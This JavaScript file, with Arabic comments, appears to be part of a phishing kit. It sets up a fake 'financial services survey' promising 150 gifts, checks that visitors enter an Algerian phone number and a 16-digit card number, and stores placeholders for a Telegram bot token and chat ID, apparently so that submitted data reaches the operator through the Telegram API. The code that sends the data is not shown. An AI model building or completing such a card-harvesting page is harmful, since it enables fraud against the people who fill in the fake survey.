// إعدادات البوت
const CONFIG = {
    TELEGRAM_BOT_TOKEN: "YOUR_BOT_TOKEN_HERE", // ضع توكن بوتك هنا
    TELEGRAM_CHAT_ID: "YOUR_CHAT_ID_HERE",     // ضع شات آيدي هنا
    API_URL: "https://api.telegram.org/bot",
    
    // إعدادات الموقع
    SITE_NAME: "استبيان الخدمات المالية",
    TOTAL_GIFTS: 150,
    
    // رسائل النظام
    MESSAGES: {
        SUCCESS: "تم الإرسال بنجاح!",
        ERROR: "حدث خطأ، حاول مرة أخرى",
        REQUIRED: "يرجى ملء جميع الحقول",
        INVALID_PHONE: "رقم الهاتف غير صحيح",
        INVALID_CARD: "رقم البطاقة يجب أن يكون 16 رقماً"
    }
};

// التحقق من صحة رقم الهاتف الجزائري
function isValidPhone(phone) {
    return /^(05|06|07)[0-9]{8}$/.test(phone);
}

// التحقق من رقم البطاقة
function isValidCard(card) {
    return /^[0-9]{16}$/.test(card);
}

// إنشاء رقم مشاركة عشوائي
function generateUserId() {
    const prefix = "FS";
    const randomNum = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}-${randomNum}`;
}